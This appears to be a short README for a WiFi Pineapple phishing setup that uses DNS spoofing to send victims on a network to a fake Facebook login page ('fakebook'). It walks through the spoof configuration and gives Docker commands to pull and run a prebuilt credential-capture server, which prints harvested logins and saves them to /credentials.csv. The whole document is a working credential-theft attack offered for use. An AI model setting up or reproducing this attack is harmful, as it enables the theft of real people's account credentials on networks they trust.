# Point to your web server
1. Connect the machine you will use to host the web server to the Management WiFi
2. Get its IP address (`ip a` on linux; `ipconfig` on windows)
3. Navigate to the dns spoof module. If not showing on the left side of the screen, look for it under *Modules & Packages*.
4. Now insert the IP address and the domain you want to spoof (fakebook.com in this example). Click *Add* and *Update Allocation*.

# Run your web server
1. Pull this image and start a container name web-server-spoof with it. Dns Spoof points to port 80 by default, so we want to map to this port too.
```
docker pull scafutto/pineapple:latest
docker tag scafutto/pineapple:latest dns-spoof
docker run -d -p 80:80 --name web-server-spoof dns-spoof
```
2. Get our backend started so we can capture credentials
```
docker exec -it web-server-spoof /bin/bash
nginx
python3 /etc/nginx/html/app.py 
```
3. The credentials are going to be printed on the terminal, but are also saved at `/credentials.csv`

# Notes
The "fakebook" page was based on [melvincwng's facebook-clone](https://github.com/melvincwng/facebook-clone).  
The current site won't do anything except for saving credentials, you may need to further develop it depending on your project.
